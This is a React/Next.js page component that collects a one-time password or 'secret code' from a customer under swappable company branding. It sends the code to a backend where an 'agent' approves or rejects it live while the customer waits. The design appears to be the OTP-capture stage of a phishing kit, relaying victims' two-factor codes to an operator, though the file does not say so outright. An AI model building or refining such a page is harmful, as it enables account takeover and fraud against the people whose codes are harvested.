'use client';

/**
 * Secret Key / OTP Stage Page
 *
 * Customer enters their one-time password or secret code
 * Minimal validation - accepts any format
 * Agent verifies in backoffice
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { WaitingState } from '@/components/verification/WaitingState';
import { ErrorState } from '@/components/verification/ErrorState';
import { currentBrand } from '@/config/branding';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card } from '@/components/ui/card';
import { AlertCircle } from 'lucide-react';

export default function SecretKeyPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId, agentMessage } = useSessionStore();

  const [secretKey, setSecretKey] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  /**
   * Reset form when agent rejects submission
   */
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      // Clear form field and show error
      setSecretKey('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
    }
  }, [status, agentMessage]);

  /**
   * Handle form submission
   */
  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      // Validate case ID is available
      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      // Minimal validation - just check required
      if (!secretKey.trim()) {
        setFieldError('Please enter your secret code');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-secret-key', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            secret_key: secretKey.trim(),
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your code. Please try again.');
          return;
        }

        // Success - show waiting state
        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your secret code...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
      } finally {
        setIsSubmitting(false);
      }
    },
    [secretKey, caseId]
  );

  // Show waiting state
  if (status === 'waiting') {
    return <WaitingState message="Verifying your secret code..." />;
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-background to-muted p-4">
      <div className="flex flex-col items-center justify-center min-h-screen space-y-6">
        {/* Brand Logo */}
        <div className="mb-4">
          <img
            src={currentBrand.logo}
            alt={currentBrand.companyName}
            className="h-12 w-auto"
            onError={(e) => {
              e.currentTarget.style.display = 'none';
            }}
          />
        </div>

        {/* Form Card */}
        <Card className="w-full max-w-md p-6 shadow-lg">
          <div className="space-y-6">
            {/* Header */}
            <div className="space-y-2">
              <h1 className="text-3xl font-bold text-foreground">
                Verification Code
              </h1>
              <p className="text-muted-foreground">
                Enter the code you received
              </p>
            </div>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Secret Key Input */}
              <div className="space-y-2">
                <label
                  htmlFor="secretKey"
                  className="block text-sm font-medium text-foreground"
                >
                  Secret Code
                </label>
                <Input
                  id="secretKey"
                  type="text"
                  placeholder="Enter your verification code"
                  value={secretKey}
                  onChange={(e) => {
                    setSecretKey(e.target.value);
                    if (fieldError) setFieldError('');
                  }}
                  disabled={isSubmitting || loading}
                  autoComplete="off"
                  required
                  className="text-lg tracking-widest"
                />
              </div>

              {/* Field-level error */}
              {fieldError && (
                <div className="flex items-center gap-2 text-sm text-destructive">
                  <AlertCircle className="h-4 w-4" />
                  <span>{fieldError}</span>
                </div>
              )}

              {/* API-level error */}
              {error && !fieldError && (
                <div className="flex items-start gap-3 p-3 bg-destructive/10 rounded-md border border-destructive/20">
                  <AlertCircle className="h-4 w-4 text-destructive mt-0.5 flex-shrink-0" />
                  <p className="text-sm text-destructive">{error}</p>
                </div>
              )}

              {/* Submit Button */}
              <Button
                type="submit"
                disabled={!secretKey.trim() || isSubmitting || loading}
                className="w-full"
                size="lg"
              >
                {isSubmitting ? 'Processing...' : 'Verify Code'}
              </Button>
            </form>

            {/* Help Text */}
            <p className="text-xs text-muted-foreground text-center">
              Check your email, SMS, or authenticator app for the code
            </p>
          </div>
        </Card>
      </div>
    </div>
  );
}
